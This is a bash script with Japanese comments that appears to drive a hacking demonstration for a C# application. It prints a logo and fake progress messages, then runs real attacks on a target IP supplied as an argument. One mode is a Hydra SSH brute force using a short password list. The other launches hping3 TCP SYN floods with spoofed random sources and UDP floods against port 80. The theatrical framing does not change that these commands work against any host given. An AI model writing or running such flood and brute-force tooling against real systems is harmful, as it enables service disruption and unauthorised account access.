#!/bin/bash

# ==========================================
#  演出用カラー定義 (アプリ本体は変更不要)
# ==========================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# root権限チェック
if [ "$EUID" -ne 0 ]; then
  echo "エラー: root権限で実行してください。"
  exit 1
fi

TARGET_IP=${1:-"127.0.0.1"}
DURATION=${2:-"15"}
MODE_ARG=${3:-"dos"}
SSH_USER=${4:-"root"}

PORT=80
THREADS=4

cleanup() {
    echo ""
    echo -e "${RED}[!] ABORT SIGNAL RECEIVED.${NC}"
    echo -e "${RED}[*] Killing processes...${NC}"
    pkill -P $$ hping3 > /dev/null 2>&1
    pkill -P $$ hydra > /dev/null 2>&1
    echo -e "${RED}[*] Terminated.${NC}"
    exit
}

trap cleanup SIGINT SIGTERM EXIT

# ==========================================
#  オープニング演出 (ハッカーっぽいロゴ)
# ==========================================
echo -e "${RED}"
cat << "EOF"
  ____ ____  ___ _   _  ____ 
 / ___|  _ \|_ _| \ | |/ ___|
| |  _| |_) || ||  \| | |  _ 
| |_| |  _ < | || |\  | |_| |
 \____|_| \_\___|_| \_|\____|
EOF
echo -e "${NC}"
echo -e "${YELLOW}TARGET LOCKED: ${RED}$TARGET_IP${NC}"
echo -e "${YELLOW}ATTACK VECTOR: ${CYAN}$MODE_ARG${NC}"
echo "------------------------------------------"

# ==========================================
#  フェイクのハッキングプロセス (雰囲気作り)
# ==========================================
# ※実際には何もしていませんが、スキャンしているフリをします
echo -n "[*] Bypassing Firewall Rules..."
sleep 0.5
echo -e " ${GREEN}[OK]${NC}"

echo -n "[*] Injecting Payload..."
sleep 0.3
echo -e " ${GREEN}[OK]${NC}"

echo -n "[*] Establishing Uplink..."
sleep 0.3
echo -e " ${GREEN}[CONNECTED]${NC}"
echo "------------------------------------------"

if [ "$MODE_ARG" = "hydra" ]; then
    # --- Hydra SSH Crack ---
    echo -e "${CYAN}[*] Starting Hydra SSH Brute Force...${NC}"
    echo -e "${CYAN}[*] Target User: $SSH_USER${NC}"
    
    # デモ用パスワードリスト作成
    echo "123456" > passlist.txt
    echo "password" >> passlist.txt
    echo "admin" >> passlist.txt
    echo "root" >> passlist.txt
    echo "kali" >> passlist.txt
    
    # Hydra実行
    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
    
    rm passlist.txt

else
    # --- DoS Attack (hping3) ---
    echo -e "${RED}[*] INITIATING FLOOD ATTACK sequence...${NC}"
    
    for (( i=1; i<=THREADS; i++ ))
    do
        # TCP SYN Flood
        echo -e "${RED}[+] Launching Thread $i (TCP-SYN)${NC}"
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
        # UDP Flood
        echo -e "${RED}[+] Launching Thread $i (UDP-FLOOD)${NC}"
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    done
    
    echo -e "${YELLOW}[!] ALL SYSTEMS GO. MAXIMUM LOAD REACHED.${NC}"
    
    # 攻撃中の演出（マトリックス風のノイズを少し出す）
    # ※C#側のログに大量に流れるので、雰囲気が出ます
    for (( i=0; i<5; i++ )); do
        sleep 1
        echo -e "${CYAN}Sending packets... $(($RANDOM % 1000)) Mbps egress${NC}"
    done
    
    wait
fi